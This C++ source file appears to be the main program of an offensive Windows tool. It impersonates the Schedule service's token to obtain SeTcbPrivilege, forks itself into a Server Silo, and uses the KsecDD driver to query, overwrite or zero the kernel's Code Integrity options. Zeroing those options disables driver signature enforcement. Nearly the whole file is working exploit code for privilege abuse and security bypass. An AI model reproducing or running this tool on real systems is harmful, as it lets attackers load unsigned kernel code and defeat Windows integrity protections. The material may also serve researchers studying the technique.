#include "common.h"
#include "ServerSilo.h"
#include "IpcServer.h"
#include "IpcClient.h"
#include <iostream>

#define CMD_QUERY_CI L"queryci" // 0
#define CMD_DISABLE_CI L"disableci" // 1
#define CMD_SET_CI L"setci" // 2

#define CMD_CODE_QUERY_CI_CODE 0
#define CMD_CODE_DISABLE_CI 1
#define CMD_CODE_SET_CI 2

BOOL g_bPrintVerbose = FALSE; // Set to TRUE to enable verbose messages
DWORD g_dwCommandCode = (DWORD)-1;
DWORD g_dwCiOptions = 0;

void PrintUsage(wchar_t* prog);
void ExecuteCommand(int cc);

int main()
{
    wchar_t** argv;
    int argc;

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    if (argc >= 2)
    {
        if (_wcsicmp(argv[1], CMD_QUERY_CI) == 0)
        {
            ExecuteCommand(CMD_CODE_QUERY_CI_CODE);
            return 0;
        }
        else if (_wcsicmp(argv[1], CMD_DISABLE_CI) == 0)
        {
            ExecuteCommand(CMD_CODE_DISABLE_CI);
            return 0;
        }
        else if (_wcsicmp(argv[1], CMD_SET_CI) == 0)
        {
            if (argc >= 3)
            {
                g_dwCiOptions = wcstoul(argv[2], nullptr, 0);

                if ((g_dwCiOptions != 0) && (g_dwCiOptions != ULONG_MAX))
                {
                    ExecuteCommand(CMD_CODE_SET_CI);
                    return 0;
                }
                else
                {
                    PRINT_ERROR(L"Failed to parse input value (or supplied value was 0): %ws\n", argv[2]);
                    return 2;
                }
            }
        }
        else
        {
            PRINT_ERROR(L"Unknown command: %ws\n", argv[1]);
            return 2;
        }
    }

    PrintUsage(argv[0]);

    return 1;
}

void PrintUsage(wchar_t* prog)
{
    wprintf(
        L""
        "\n"
        " Usage:\n"
        "     %ws <CMD> [<ARGS>]\n"
        "\n"
        " Query the CI options value:\n"
        "     %ws %ws\n"
        " Set the CI options value to 0:\n"
        "     %ws %ws\n"
        " Set the CI options value:\n"
        "     %ws %ws <VALUE>\n"
        ,
        prog,
        prog,
        CMD_QUERY_CI,
        prog,
        CMD_DISABLE_CI,
        prog,
        CMD_SET_CI
    );
}

void ExecuteCommand(int cc)
{
    KsecDD* ksec = nullptr;
    ServerSilo* silo = nullptr;
    HANDLE hScheduleToken = NULL;
    BOOL bImpersonation = FALSE;
    PROCESS_INFORMATION pi = { 0 };

    //
    // SeTcbPrivilege is required for creating a Server Silo. Since administrators
    // don't have this privilege, we'll use the token of the Schedule service instead.
    //

    if (!Common::EnablePrivilege(NULL, SE_IMPERSONATE_NAME) || !Common::EnablePrivilege(NULL, SE_DEBUG_NAME)) goto exit;
    PRINT_VERBOSE(L"Enabled required privileges.\n");

    if (!Common::OpenServiceToken(L"Schedule", &hScheduleToken)) goto exit;
    PRINT_VERBOSE(L"Got Schedule service's token.\n");
    
    if (!Common::EnablePrivilege(hScheduleToken, SE_TCB_NAME)) goto exit;
    PRINT_VERBOSE(L"Enabled SeTcbPrivilege in token.\n");

    if (!Common::ImpersonateToken(hScheduleToken)) goto exit;
    PRINT_VERBOSE(L"Impersonating Schedule service...\n");

    bImpersonation = TRUE;

    silo = new ServerSilo();
    if (!silo->IsInitialized()) goto exit;
    PRINT_SUCCESS(L"Silo created and initialized (path is %ws).\n", silo->GetRootDirectory());

    //
    // Once the Server Silo is created, we no longer need to impersonate SYSTEM. So, 
    // we can "revert to self", and close the Token handle.
    //

    if (!Common::RevertImpersonation()) goto exit;
    PRINT_VERBOSE(L"Reverted impersonation.\n");

    bImpersonation = FALSE;
    CloseHandle(hScheduleToken);
    hScheduleToken = NULL;

    //
    // We should initialize our KsecDD client in the forked process (see below), but
    // doing it here will allow us to see error messages on the console. It would
    // technically be feasible to attach the forked process to the parent's console,
    // though the result is not consistent throughout Windows versions.
    //

    ksec = new KsecDD();
    if (!ksec->IsInitialized()) goto exit;

    //
    // Now, we need to execute code in the Server Silo. We could get the command line
    // of the current process, and use that to start a new process. However, there is
    // no guarantee that the current program is the one we want to execute (in case
    // of process injection for instance). Instead, we can fork the current process
    // and take different code paths, depending on whether we are in the parent or 
    // the child. This comes at the expense of having to handle resources and open
    // handles very carefully though.
    //

    if (!Common::ForkProcessIntoServerSilo(silo->GetHandle(), &pi)) goto exit;

    //
    // If the 'fork' succeeds, the Process handle value of the PROCESS_INFORMATION
    // structure is populated with the handle of the child process. That's how we
    // now we are still in the 'main' process. Therefore, the other code path
    // is only taken in the 'child' process.
    //

    if (pi.hProcess)
    {
        //
        // We are in the parent process! We will use a named pipe as an IPC mechanism
        // to communicate with the child process.
        //

        IpcClient* client = nullptr;
        DWORD dwExitCode = 0;

        PRINT_SUCCESS(L"Process forked (child pid is %d).\n", pi.dwProcessId);

        client = new IpcClient();

        //
        // Try to connect to the child's named pipe in a loop, and wait 1s before each
        // attempt. After 5 failed attempts, we safely exit.
        //

        for (int i = 0; i < 5; i++)
        {
            Sleep(1000);
            if (client->Connect()) break;
        }

        if (!client->IsConnected())
        {
            PRINT_ERROR(L"Failed to connect to IPC server.\n");
            goto parent_exit;
        }

        //
        // Send a PING command to the child to make sure the IPC is working properly.
        //

        PRINT_VERBOSE(L"Sending PING request...\n");
        if (!client->SendPingRequest()) goto parent_exit;
        PRINT_VERBOSE(L"PING request OK\n");

        PRINT_SUCCESS(L"Connected to child process!\n");

        switch (cc)
        {
        case CMD_CODE_QUERY_CI_CODE:
            PRINT_VERBOSE(L"Sending Query CiOptions request...\n");
            if (!client->SendQueryCiOptionsRequest(&g_dwCiOptions)) goto parent_exit;
            PRINT_SUCCESS(L"Query CiOptions request OK, current value is: 0x%08x\n", g_dwCiOptions);
            break;
        case CMD_CODE_DISABLE_CI:
            PRINT_VERBOSE(L"Sending Disable CI request...\n");
            if (!client->SendDisableCiRequest()) goto parent_exit;
            PRINT_SUCCESS(L"Disable CI request OK\n");
            break;
        case CMD_CODE_SET_CI:
            PRINT_VERBOSE(L"Sending Set CiOptions request...\n");
            if (!client->SendSetCiOptionsRequest(g_dwCiOptions)) goto parent_exit;
            PRINT_SUCCESS(L"Set CiOptions request OK\n");
            break;
        default:
            PRINT_ERROR(L"Unknown command code: %d\n", cc);
        }

        PRINT_VERBOSE(L"Sending PING request...\n");
        if (!client->SendPingRequest()) goto parent_exit;
        PRINT_VERBOSE(L"PING request OK\n");

    parent_exit:
        if (client && client->IsConnected())
        {
            client->Disconnect();
        }

        //
        // Wait for the child process to terminate indefinitely. Note, that is not
        // ideal as we could be waiting forever. We should wait for a few seconds,
        // and then kill the process if it's unresponsive instead.
        //

        PRINT_VERBOSE(L"Waiting for child process (%d) to terminate...\n", pi.dwProcessId);
        NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

        if (pi.hProcess) NtClose(pi.hProcess);
        if (pi.hThread) NtClose(pi.hThread);
        if (client) delete client;
        if (silo) delete silo;
    }
    else
    {
        //
        // We are in the child process! We'll create a named pipe to let the parent
        // process communicate with us.
        //

        IpcServer* server = nullptr;
        HANDLE hListenThread = NULL;

        if (!ksec->Connect()) goto child_exit;

        server = new IpcServer();

        if (!server->IsInitialized()) goto child_exit;
        if (!server->SetKsecClient(ksec)) goto child_exit;
        if (!server->ListenInThread(&hListenThread)) goto child_exit;

        WaitForSingleObject(hListenThread, INFINITE);
        
    child_exit:
        if (hListenThread) CloseHandle(hListenThread);
        if (server) delete server;
        if (ksec->IsConnected()) ksec->Disconnect();
        
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

exit:
    if (bImpersonation) RevertToSelf();
    if (hScheduleToken) CloseHandle(hScheduleToken);
    if (ksec) delete ksec;

    wprintf(L"All done.\n");
}